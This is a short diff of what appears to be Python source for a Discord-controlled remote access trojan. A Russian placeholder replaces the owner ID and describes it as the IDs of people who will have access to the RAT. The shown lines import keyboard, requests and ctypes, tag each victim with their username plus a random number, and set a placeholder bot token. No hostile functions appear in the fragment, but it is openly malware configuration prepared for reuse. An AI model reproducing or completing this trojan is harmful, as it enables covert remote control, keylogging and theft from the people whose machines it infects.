@@ -17,7 +17,7 @@ import keyboard
 import requests
 import ctypes
 from asyncio import sleep
-owners = [974185433137287189]
+owners = [айди людей которые будут иметь доступ к ратнukу]
 userid=getuser()+str(random.randint(123, 321))
 token = 'токен бота'
 bot = commands.Bot(intents = discord.Intents.all(), command_prefix='cb.')
